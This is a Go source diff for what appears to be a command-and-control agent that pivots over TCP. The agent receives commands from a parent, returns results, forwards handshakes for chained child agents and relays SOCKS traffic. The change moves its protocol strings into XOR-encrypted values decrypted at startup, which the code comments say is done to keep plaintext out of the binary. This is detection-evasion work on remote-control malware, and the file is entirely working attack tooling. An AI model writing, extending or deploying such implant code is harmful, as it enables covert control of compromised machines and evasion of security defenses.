@@ -51,6 +51,28 @@ var (
 	MALLEABLE_PAYLOAD_FIELD             = "p"
 )
 
+// Protocol strings - injected at build time via ldflags (XOR encrypted)
+// Decrypted at runtime using xorKey to eliminate plaintext from binary
+var (
+	protoTypeHandshake   string // "handshake"
+	protoTypeHsResp      string // "handshake_response"
+	protoTypePing        string // "ping"
+	protoTypePong        string // "pong"
+	protoTypeData        string // "data"
+	protoTypeDisconnect  string // "disconnect"
+	protoTypeLinkHsResp  string // "link_handshake_response"
+	protoKeyType         string // "type"
+	protoKeyPayload      string // "payload"
+	protoKeyAgentId      string // "agent_id"
+	protoKeyResults      string // "results"
+	protoKeyCommands     string // "commands"
+	protoKeySr           string // "sr"
+	protoAuthPrefix      string // "AUTH:"
+	protoAuthOk          string // "OK"
+	protoMetaStartup     string // "startup_time"
+	protoMetaActive      string // "active"
+)
+
 // Parsed TCP transforms - initialized on first use
 var parsedTCPTransforms *SMBDataBlock
 
@@ -67,6 +89,25 @@ var (
 var currentPrependLen, currentAppendLen int
 
 func init() {
+	// Decrypt protocol strings at startup using xorKey
+	protoTypeHandshake, _ = xorDecrypt(protoTypeHandshake, xorKey)
+	protoTypeHsResp, _ = xorDecrypt(protoTypeHsResp, xorKey)
+	protoTypePing, _ = xorDecrypt(protoTypePing, xorKey)
+	protoTypePong, _ = xorDecrypt(protoTypePong, xorKey)
+	protoTypeData, _ = xorDecrypt(protoTypeData, xorKey)
+	protoTypeDisconnect, _ = xorDecrypt(protoTypeDisconnect, xorKey)
+	protoTypeLinkHsResp, _ = xorDecrypt(protoTypeLinkHsResp, xorKey)
+	protoKeyType, _ = xorDecrypt(protoKeyType, xorKey)
+	protoKeyPayload, _ = xorDecrypt(protoKeyPayload, xorKey)
+	protoKeyAgentId, _ = xorDecrypt(protoKeyAgentId, xorKey)
+	protoKeyResults, _ = xorDecrypt(protoKeyResults, xorKey)
+	protoKeyCommands, _ = xorDecrypt(protoKeyCommands, xorKey)
+	protoKeySr, _ = xorDecrypt(protoKeySr, xorKey)
+	protoAuthPrefix, _ = xorDecrypt(protoAuthPrefix, xorKey)
+	protoAuthOk, _ = xorDecrypt(protoAuthOk, xorKey)
+	protoMetaStartup, _ = xorDecrypt(protoMetaStartup, xorKey)
+	protoMetaActive, _ = xorDecrypt(protoMetaActive, xorKey)
+
 	// Parse embedded TCP transforms if configured
 	if tcpDataTransforms != "" && xorKey != "" {
 		// First Base64 decode, then XOR decrypt (matches server-side encryption)
@@ -163,58 +204,65 @@ func handleConnection(conn *TCPConnection, config map[string]string) {
 
 		// Try to parse as legacy JSON format first
 		// NOTE: Parent agent sends "payload" (not "pl") for the payload field
-		var msgEnvelope struct {
-			Type    string `json:"type"`
-			Payload string `json:"payload"`
-		}
+		var msgMap map[string]interface{}
 
 		var messageData []byte
 		var isTransformed bool
 
-		if err := json.Unmarshal(rawMessage, &msgEnvelope); err == nil && msgEnvelope.Type != "" {
-			// Successfully parsed as JSON with type field - legacy format
-			isTransformed = false
-			messageData = rawMessage
-		} else if parsedTCPTransforms != nil && len(parsedTCPTransforms.Transforms) > 0 {
-			// Not valid legacy JSON and we have transforms configured
-			// Assume it's transformed data - reverse transforms to get JSON envelope
-			reversed, err := reverseSMBTransforms(rawMessage, parsedTCPTransforms.Transforms, currentPrependLen, currentAppendLen)
-			if err != nil {
-				continue
+		if err := json.Unmarshal(rawMessage, &msgMap); err == nil {
+			if typeStr, _ := msgMap[protoKeyType].(string); typeStr != "" {
+				// Successfully parsed as JSON with type field - legacy format
+				isTransformed = false
+				messageData = rawMessage
 			}
+		}
 
-			// Parse the reversed data as JSON envelope
-			if err := json.Unmarshal(reversed, &msgEnvelope); err != nil {
+		if messageData == nil {
+			if parsedTCPTransforms != nil && len(parsedTCPTransforms.Transforms) > 0 {
+				// Not valid legacy JSON and we have transforms configured
+				// Assume it's transformed data - reverse transforms to get JSON envelope
+				reversed, err := reverseSMBTransforms(rawMessage, parsedTCPTransforms.Transforms, currentPrependLen, currentAppendLen)
+				if err != nil {
+					continue
+				}
+
+				// Parse the reversed data as JSON envelope
+				msgMap = make(map[string]interface{})
+				if err := json.Unmarshal(reversed, &msgMap); err != nil {
+					continue
+				}
+				isTransformed = true
+				messageData = reversed
+			} else {
+				// No transforms configured and not valid JSON - skip
 				continue
 			}
-			isTransformed = true
-			messageData = reversed
-		} else {
-			// No transforms configured and not valid JSON - skip
-			continue
 		}
 
 		// Store transform mode for response handling
 		_ = isTransformed // May be used later for response handling
 
-		switch msgEnvelope.Type {
-		case "data":
-			handleServerData(conn, msgEnvelope.Payload)
+		msgType, _ := msgMap[protoKeyType].(string)
+		msgPayload, _ := msgMap[protoKeyPayload].(string)
 
-		case "handshake_response":
+		switch msgType {
+		case protoTypeData:
+			handleServerData(conn, msgPayload)
+
+		case protoTypeHsResp:
 			// Check for lr field that needs forwarding to children
 			handleHandshakeResponseWithForwarding(messageData)
 
-		case "link_handshake_response":
+		case protoTypeLinkHsResp:
 			// This is a forwarded handshake response for a child agent
 			// Parse the raw message to get the lr field
 			handleLinkHandshakeResponse(messageData)
 
-		case "ping":
+		case protoTypePing:
 			// Heartbeat from parent - respond with pong to keep connection alive
 			sendPong(conn)
 
-		case "disconnect":
+		case protoTypeDisconnect:
 			return
 		}
 
@@ -254,7 +302,7 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 		}
 
 		// Extract commands array if present
-		if cmdsVal, ok := payloadData["commands"]; ok {
+		if cmdsVal, ok := payloadData[protoKeyCommands]; ok {
 			cmdsJSON, err := json.Marshal(cmdsVal)
 			if err == nil {
 				commandQueue.AddCommands(string(cmdsJSON))
@@ -296,11 +344,11 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 		results := resultManager.GetPendingResults()
 
 		payload := map[string]interface{}{
-			"agent_id": clientID,
+			protoKeyAgentId: clientID,
 		}
 
 		if len(results) > 0 {
-			payload["results"] = results
+			payload[protoKeyResults] = results
 		}
 
 		// Include link data from child agents (to be forwarded up the chain)
@@ -320,7 +368,7 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 
 		// Include SOCKS HTTP responses
 		if hasSocksResponses {
-			payload["sr"] = socksResponses
+			payload[protoKeySr] = socksResponses
 		}
 
 		jsonData, err := json.Marshal(payload)
@@ -344,7 +392,7 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 	} else {
 		// Still need to send an empty response so parent knows we're done
 		emptyPayload := map[string]interface{}{
-			"agent_id": clientID,
+			protoKeyAgentId: clientID,
 		}
 		jsonData, _ := json.Marshal(emptyPayload)
 		encrypted, err := secureComms.EncryptMessage(string(jsonData))
@@ -365,8 +413,8 @@ func handleServerData(conn *TCPConnection, encryptedPayload string) {
 func sendTCPResponse(conn *TCPConnection, encryptedPayload string) error {
 	// Create JSON envelope
 	response := map[string]string{
-		"type":    "data",
-		"payload": encryptedPayload,
+		protoKeyType:    protoTypeData,
+		protoKeyPayload: encryptedPayload,
 	}
 	respJSON, err := json.Marshal(response)
 	if err != nil {
@@ -469,8 +517,8 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 		}
 
 		message := map[string]interface{}{
-			"type":                              "handshake_response",
-			"payload":                           payload,
+			protoKeyType:                        protoTypeHsResp,
+			protoKeyPayload:                     payload,
 			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD: []interface{}{respMap},
 		}
 
@@ -490,7 +538,7 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 // sendPong sends a pong response to the parent agent
 func sendPong(conn *TCPConnection) {
 	response := map[string]string{
-		"type": "pong",
+		protoKeyType: protoTypePong,
 	}
 	respJSON, err := json.Marshal(response)
 	if err != nil {
